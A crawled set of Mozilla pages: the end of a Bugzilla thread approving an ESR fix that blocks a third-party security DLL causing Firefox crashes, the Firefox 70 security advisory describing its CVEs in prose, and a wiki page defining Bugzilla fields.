|  | |

Hi Jamie, should we take this on ESR68 for 68.1esr also? If so, please nominate :)

Flags: needinfo?(jteh)

|  | [James Teh [:Jamie] (away returning 28 Jan)](/user_profile?user_id=219126)  Assignee |  |
| --- | --- | --- |
| [Comment 36](/show_bug.cgi?id=1536227#c36)• 5 years ago |
|  | |

Ideally, since this fix is somewhat speculative, I'd like some confirmation that this reduces the crash rate on beta/release before nominating for ESR uplift. That said, despite [comment 4](/show_bug.cgi?id=1536227#c4 "VERIFIED FIXED - Crash in [@ nsTArray_Impl<T>::RemoveElement<T>(class `anonymous namespace'::ParentImpl*& const, const class nsDefaultComparator<T>& const) | mozilla::a11y::DocAccessibleParent::RecvHideEvent]") noting that this was significant on beta, I can't see many crashes on beta versions going back several months. Am I missing something here? If I'm correct, that would mean we'd need to wait for 69 final release to see if this improves things.

Flags: needinfo?(jteh)

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1536227#a13470271_280903)• 5 years ago |

Whiteboard: [adv-main69+]

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 37](/show_bug.cgi?id=1536227#c37)• 5 years ago |
|  | |

[Tracking Requested - why for this release]: re-nominating for 68.2

[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
[69+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=69%2B) → [?](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=%3F)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1536227#a14596060_75935)• 5 years ago |

[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=%3F) → [70+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=70%2B)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 38](/show_bug.cgi?id=1536227#c38)• 5 years ago |
|  | |

This is looking good on Release 69 now. I think we're good to request ESR68 approval now :)

Flags: needinfo?(jteh)

|  | [James Teh [:Jamie] (away returning 28 Jan)](/user_profile?user_id=219126)  Assignee |  |
| --- | --- | --- |
| [Comment 39](/show_bug.cgi?id=1536227#c39)• 5 years ago |
|  | |

Comment on [attachment 9057749](/attachment.cgi?id=9057749 "Bug 1536227: Block safemon64.dll (360 Safeguard/360 Total Security) for causing a11y crashes.") [[details]](/attachment.cgi?id=9057749&action=edit "Bug 1536227: Block safemon64.dll (360 Safeguard/360 Total Security) for causing a11y crashes.")

[Bug 1536227](/show_bug.cgi?id=1536227 "VERIFIED FIXED - Crash in [@ nsTArray_Impl<T>::RemoveElement<T>(class `anonymous namespace'::ParentImpl*& const, const class nsDefaultComparator<T>& const) | mozilla::a11y::DocAccessibleParent::RecvHideEvent]"): Block safemon64.dll (360 Safeguard/360 Total Security) for causing a11y crashes.

### ESR Uplift Approval Request

* **If this is not a sec:{high,crit} bug, please state case for ESR consideration**: Crashes.
* **User impact if declined**: Crashes which we suspect to be caused by third party security software.
* **Fix Landed on Version**: 69
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: Blocks injection of third party security software into Firefox which has no known reason to inject. QA confirmed that running with this block does not negatively impact the third party software.
* **String or UUID changes made by this patch**: None.
Flags: needinfo?(jteh)
[Attachment #9057749](/attachment.cgi?id=9057749&action=edit "Bug 1536227: Block safemon64.dll (360 Safeguard/360 Total Security) for causing a11y crashes.") -
Flags: approval-mozilla-esr68?

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 40](/show_bug.cgi?id=1536227#c40)• 5 years ago |
|  | |

Comment on [attachment 9057749](/attachment.cgi?id=9057749 "Bug 1536227: Block safemon64.dll (360 Safeguard/360 Total Security) for causing a11y crashes.") [[details]](/attachment.cgi?id=9057749&action=edit "Bug 1536227: Block safemon64.dll (360 Safeguard/360 Total Security) for causing a11y crashes.")

[Bug 1536227](/show_bug.cgi?id=1536227 "VERIFIED FIXED - Crash in [@ nsTArray_Impl<T>::RemoveElement<T>(class `anonymous namespace'::ParentImpl*& const, const class nsDefaultComparator<T>& const) | mozilla::a11y::DocAccessibleParent::RecvHideEvent]"): Block safemon64.dll (360 Safeguard/360 Total Security) for causing a11y crashes.

Fixes a startup crash caused by some third-party software. Approved for 68.2esr.

[Attachment #9057749](/attachment.cgi?id=9057749&action=edit "Bug 1536227: Block safemon64.dll (360 Safeguard/360 Total Security) for causing a11y crashes.") -
Flags: approval-mozilla-esr68? → approval-mozilla-esr68+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 41](/show_bug.cgi?id=1536227#c41)• 5 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-esr68/rev/050d4498c37c>

[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=fixed)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1536227#a17822781_578488)• 5 years ago |

Whiteboard: [adv-main69+] → [adv-main69+][adv-esr68.2+]

|  | [Rares Doghi, Desktop QA](/user_profile?user_id=615351) |  |
| --- | --- | --- |
| [Comment 42](/show_bug.cgi?id=1536227#c42)• 5 years ago |
|  | |

Hi, I have retested this issue in our latest esr68.2 build and after unblocking Firefox from the 360 Total security I couldnt find any issues, no crashes occured while testing flash games, flash sites, videos or some of the most popular websites. I think we can mark this issue as Verified, I will update the flags.

Status: RESOLVED → VERIFIEDQA Whiteboard: [qa-triaged]
[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=verified)Flags: qe-verify+

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1536227#a18137339_578488)• 5 years ago |

Whiteboard: [adv-main69+][adv-esr68.2+] → [adv-main69+][adv-esr68.2-rollup]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1536227#a18738112_578488)• 5 years ago |

Alias: CVE-2019-11758

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1536227#a38400079_1689)• 5 years ago |

Group: core-security-release
You need to [log in](/show_bug.cgi?id=1536227&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [James Teh [:Jamie] (away returning 28 Jan)](/user_profile?user_id=219126)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from www.mozilla.org_8922780a_20250121_000033.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2019-34

## Security vulnerabilities fixed in - Firefox 70

Announced
October 22, 2019
Impact
critical
Products
Firefox
Fixed in

* Firefox 70

**Note:** We have updated this advisory on June 26, 2020 to include CVE-2020-12412 and on March 20, 2023 to include CVE-2019-25136, which were fixed in Firefox 70 but not recognized or acknowledged immediately.

#### [#CVE-2018-6156: Heap buffer overflow in FEC processing in WebRTC](#CVE-2018-6156)

Reporter
Google Project Zero
Impact
high
##### Description

Incorrect derivation of a packet length in WebRTC caused heap corruption via a crafted video file. This resulted in a potentially exploitable crash.

##### References

* [Bug 1480088](https://bugzilla.mozilla.org/show_bug.cgi?id=1480088)

#### [#CVE-2019-15903: Heap overflow in expat library in XML\_GetCurrentLineNumber](#CVE-2019-15903)

Reporter
Sebastian Pipping
Impact
high
##### Description

In libexpat before 2.2.8, crafted XML input could fool the parser into changing from DTD parsing to document parsing too early. A subsequent call to `XML_GetCurrentLineNumber` or `XML_GetCurrentColumnNumber` then resulted in a heap-based buffer over-read.

##### References

* [Bug 1584907](https://bugzilla.mozilla.org/show_bug.cgi?id=1584907)

#### [#CVE-2019-11757: Use-after-free when creating index updates in IndexedDB](#CVE-2019-11757)

Reporter
Zhanjia Song
Impact
high
##### Description

When storing a value in IndexedDB, the value's prototype chain is followed and it was possible to retain a reference to a locale, delete it, and subsequently reference it. This resulted in a use-after-free and a potentially exploitable crash.

##### References

* [Bug 1577107](https://bugzilla.mozilla.org/show_bug.cgi?id=1577107)

#### [#CVE-2019-25136: Invalid styles allowed from content processes](#CVE-2019-25136)

Reporter
Emilio Cobos Álvarez
Impact
high
##### Description

A compromised child process could have injected XBL Bindings into privileged CSS rules, resulting in arbitrary code execution and a sandbox escape.

##### References

* [Bug 1530709](https://bugzilla.mozilla.org/show_bug.cgi?id=1530709)

#### [#CVE-2020-12412: Address bar spoof using history navigation and blocked ports](#CVE-2020-12412)

Reporter
Adrian Karolak from ING Tech Poland
Impact
moderate
##### Description

By navigating a tab using the history API, an attacker could cause the address bar to display the incorrect domain (with the https:// scheme, a blocked port number such as '1', and without a lock icon) while controlling the page contents.

##### References

* [Bug 1528587](https://bugzilla.mozilla.org/show_bug.cgi?id=1528587)

#### [#CVE-2019-11759: Stack buffer overflow in HKDF output](#CVE-2019-11759)

Reporter
Guido Vranken
Impact
moderate
##### Description

An attacker could have caused 4 bytes of HMAC output to be written past the end of a buffer stored on the stack. This could be used by an attacker to execute arbitrary code or more likely lead to a crash.

##### References

* [Bug 1577953](https://bugzilla.mozilla.org/show_bug.cgi?id=1577953)

#### [#CVE-2019-11760: Stack buffer overflow in WebRTC networking](#CVE-2019-11760)

Reporter
Nils
Impact
moderate
##### Description

A fixed-size stack buffer could overflow in nrappkit when doing WebRTC signaling. This resulted in a potentially exploitable crash in some instances.

##### References

* [Bug 1577719](https://bugzilla.mozilla.org/show_bug.cgi?id=1577719)

#### [#CVE-2019-11761: Unintended access to a privileged JSONView object](#CVE-2019-11761)

Reporter
Cody Crews
Impact
moderate
##### Description

By using a form with a data URI it was possible to gain access to the privileged `JSONView` object that had been cloned into content. Impact from exposing this object appears to be minimal, however it was a bypass of existing defense in depth mechanisms.

##### References

* [Bug 1561502](https://bugzilla.mozilla.org/show_bug.cgi?id=1561502)

#### [#CVE-2019-11762: document.domain-based origin isolation has same-origin-property violation](#CVE-2019-11762)

Reporter
Kris Maglione
Impact
moderate
##### Description

If two same-origin documents set document.domain differently to become cross-origin, it was possible for them to call arbitrary DOM methods/getters/setters on the now-cross-origin window.

##### References

* [Bug 1582857](https://bugzilla.mozilla.org/show_bug.cgi?id=1582857)

#### [#CVE-2019-11763: Incorrect HTML parsing results in XSS bypass technique](#CVE-2019-11763)

Reporter
Gareth Heyes
Impact
moderate
##### Description

Failure to correctly handle null bytes when processing HTML entities resulted in Firefox incorrectly parsing these entities. This could have led to HTML comment text being treated as HTML which could have led to XSS in a web application under certain conditions. It could have also led to HTML entities being masked from filters, enabling the use of entities to mask the actual characters of interest from filters.

##### References

* [Bug 1584216](https://bugzilla.mozilla.org/show_bug.cgi?id=1584216)

#### [#CVE-2019-11765: Incorrect permissions could be granted to a website](#CVE-2019-11765)

Reporter
Paul Theriault
Impact
moderate
##### Description

A compromised content process could send a message to the parent process that would cause the 'Click to Play' permission prompt to be shown. However, due to lack of validation from the parent process, if the user accepted the permission request an attacker-controlled permission would be granted rather than the 'Click to Play' permission.

##### References

* [Bug 1562582](https://bugzilla.mozilla.org/show_bug.cgi?id=1562582)

#### [#CVE-2019-17000: CSP bypass using object tag with data: URI](#CVE-2019-17000)

Reporter
Yangzheng Li
Impact
moderate
##### Description

An object tag with a data URI did not correctly inherit the document's Content Security Policy. This allowed a CSP bypass in a cross-origin frame if the document's policy explicitly allowed `data:` URIs.

##### References

* [Bug 1441468](https://bugzilla.mozilla.org/show_bug.cgi?id=1441468)

#### [#CVE-2019-17001: CSP bypass using object tag when script-src 'none' is specified](#CVE-2019-17001)

Reporter
Matheus Vrech
Impact
moderate
##### Description

A Content-Security-Policy that blocks in-line scripts could be bypassed using an object tag to execute JavaScript in the protected document (cross-site scripting). This is a separate bypass from CVE-2019-17000.
*Note: This flaw only affected Firefox 69 and was not present in earlier versions.*

##### References

* [Bug 1587976](https://bugzilla.mozilla.org/show_bug.cgi?id=1587976)

#### [#CVE-2019-17002: upgrade-insecure-requests was not being honored for links dragged and dropped](#CVE-2019-17002)

Reporter
Kevin Brosnan
Impact
low
##### Description

If `upgrade-insecure-requests` was specified in the Content Security Policy, and a link was dragged and dropped from that page, the link was not upgraded to https.

##### References

* [Bug 1561056](https://bugzilla.mozilla.org/show_bug.cgi?id=1561056)

#### [#CVE-2019-11764: Memory safety bugs fixed in Firefox 70 and Firefox ESR 68.2](#CVE-2019-11764)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Bob Clary, Jason Kratzer, Aaron Klotz, Iain Ireland, Tyson Smith, Christian Holler, Steve Fink, Honza Bambas, Byron Campen, and Cristian Brindusan reported memory safety bugs present in Firefox 69 and Firefox ESR 68.1. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could be exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 70 and Firefox ESR 68.2](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1558522%2C1577061%2C1548044%2C1571223%2C1573048%2C1578933%2C1575217%2C1583684%2C1586845%2C1581950%2C1583463%2C1586599)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from wiki.mozilla.org_73f8d6fa_20250121_020854.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)


